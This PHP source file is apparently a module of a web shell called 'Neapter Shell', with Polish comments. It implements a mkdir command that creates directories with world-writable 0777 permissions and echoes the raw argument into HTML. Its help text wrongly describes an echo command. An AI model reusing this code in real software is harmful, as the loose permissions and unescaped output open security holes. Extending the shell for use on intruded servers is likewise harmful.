<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * ModuleMkdir - Tworzenie katalogu
 */
class ModuleMkdir implements ShellInterface
{
	/**
	 * Obiekt Shell
	 *
	 * @access private
	 * @var    object
	 */
	private $oShell;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @param  object $oShell Obiekt Shell
	 * @return void
	 */
	public function __construct( Shell $oShell )
	{
		$this -> oShell = $oShell;
	}

	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array( 'mkdir' );
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.00 2011-06-04 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Wyświetla tekst

	Użycie:
		echo tekst do wyświetlenia
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		if( $this -> oShell -> iArgc === 0 )
		{
			return $this -> getHelp();
		}

		$sOutput = NULL;

		for( $i = 0; $i < $this -> oShell -> iArgc; $i++ )
		{
			if( ! mkdir( $this -> oShell -> aArgv[ $i ], 0777, TRUE ) )
			{
				$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został utworzony</span>\r\n", $this -> oShell -> aArgv[ $i ] );
			}
			else
			{
				$sOutput .= sprintf( "Katalog \"%s\" <span class=\"green\">został utworzony</span>\r\n", $this -> oShell -> aArgv[ $i ] );
			}
		}

		return $sOutput;
	}

}